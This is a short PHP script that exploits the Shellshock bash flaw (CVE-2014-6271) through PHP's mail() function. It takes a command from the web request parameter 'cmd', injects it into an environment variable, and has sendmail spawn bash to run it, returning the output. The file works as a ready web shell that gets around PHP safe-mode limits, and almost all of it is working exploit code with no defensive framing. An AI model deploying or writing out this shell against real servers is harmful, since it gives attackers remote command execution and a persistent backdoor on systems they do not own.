<?php
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @
mail.c:283
   if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
     $tmp = tempnam(".","data");
     putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
     // In Safe Mode, the user may only alter environment variables
whose names
     // begin with the prefixes supplied by this directive.
     // By default, users will only be able to set environment variables
that
     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is
empty,
     // PHP will let the user modify ANY environment variable!
     mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually
send any mail
   }
   else return "Not vuln (not bash)";
   $output = @file_get_contents($tmp);
   @unlink($tmp);
   if($output != "") return $output;
   else return "No output, or not vuln.";
}
shellshock($_REQUEST["cmd"]);
?>